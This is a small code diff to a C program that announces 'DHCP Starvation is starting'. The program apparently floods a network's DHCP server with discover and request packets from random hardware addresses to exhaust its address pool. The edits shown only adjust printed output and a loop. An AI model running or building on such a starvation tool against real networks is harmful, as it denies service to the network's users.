@@ -112,7 +112,7 @@ int create_socket(char *interface_name) {
         exit(EXIT_FAILURE);
     }
 
-    printf("File descriptor for new socket: %d\n", sock);
+    printf("File descriptor for new socket: %d\n\n", sock);
 
     set_reuse_flag(sock);
     set_broadcast_flag(sock);
@@ -311,6 +311,7 @@ int get_DHCP_offer_packet(int sock) {
 
     printf("OFFERED ADDRESS:    %s\n", inet_ntoa(offer_packet.yiaddr));
     offered_address = offer_packet.yiaddr;
+
     send_DHCP_request_packet(sock, source.sin_addr);
 
     return SUCCESS;
@@ -328,11 +329,10 @@ int main(int argc, char *argv[]) {
     srand(time(NULL)); // NOLINT(cert-msc51-cpp)
 
     DEBUG = 0;
-    puts("DHCP Starvation is starting");
+    puts("DHCP Starvation is starting\n");
 
     int sock = create_socket(interface_name);
-    // while (1) {
-    for (int count = 0; count < 1; count++) {
+    for (int i = 0; i < 1; i++) {
         make_random_hardware_address();
         send_DHCP_discover_packet(sock);
         get_DHCP_offer_packet(sock);
